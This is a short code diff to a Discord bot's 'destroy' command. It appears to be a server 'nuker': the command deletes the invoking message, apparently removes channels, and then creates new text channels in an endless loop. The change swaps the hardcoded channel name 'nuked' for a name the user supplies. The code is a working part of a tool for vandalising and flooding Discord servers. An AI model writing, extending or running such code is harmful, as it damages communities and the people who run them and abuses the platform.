@@ -30,7 +30,7 @@ async def on_ready():
 
 
 @client.command()
-async def destroy (ctx):
+async def destroy (ctx,message):
     guild=ctx.message.guild
     await ctx.message.delete()
     
@@ -41,11 +41,11 @@ async def destroy (ctx):
         except:
              pass
     for i in range(1):
-        await guild.create_text_channel("nuked")
+        await guild.create_text_channel(f"{message}")
     while True:
         for channel in guild.text_channels:
             for i in range (1):
-                await guild.create_text_channel("nuked")
+                await guild.create_text_channel(f"{message}")
  
 
 @client.command()
